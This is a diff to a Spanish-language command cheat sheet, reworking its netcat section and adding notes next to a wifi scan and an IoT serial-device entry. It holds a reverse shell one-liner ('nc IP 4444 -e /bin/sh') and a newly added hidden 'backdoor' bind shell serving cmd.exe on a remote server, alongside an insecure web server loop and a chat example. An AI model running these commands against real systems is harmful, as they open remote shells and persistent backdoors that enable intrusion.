@@ -622,7 +622,8 @@ Escaneo de Redes Wifi Disponibles
 
 ``` sudo iwlist wlan0 scan | egrep "Cell|ESSID|Signal|Rates"```
 
-# Reverse Shell con Ncat
+# Ncat:
+## Reverse Shell
 
 Desarrollador escucha en puerto 4444
 
@@ -632,6 +633,22 @@ Cliente envía su Shell a la IP del desarrollador
 
 ```nc **IP** 4444 -e /bin/sh```
 
+## Backdoor
+
+Ejecutar en el servidor remoto
+
+```nc -L -p 3001 -d -e cmd.exe```
+
+## Servidor web inseguro
+
+```while : ; do ( echo -ne "HTTP/1.1 200 OK\r\n" ; cat index.html; ) | nc -l -p 8080 ; done```
+
+## Chat
+```
+nc -l -vv -p 5000
+nc 192.168.56.1 5000
+
+```
 # IOT
 
 Dispositivos conectados USB por conexión serial. Ubicarlo es sencillo con:
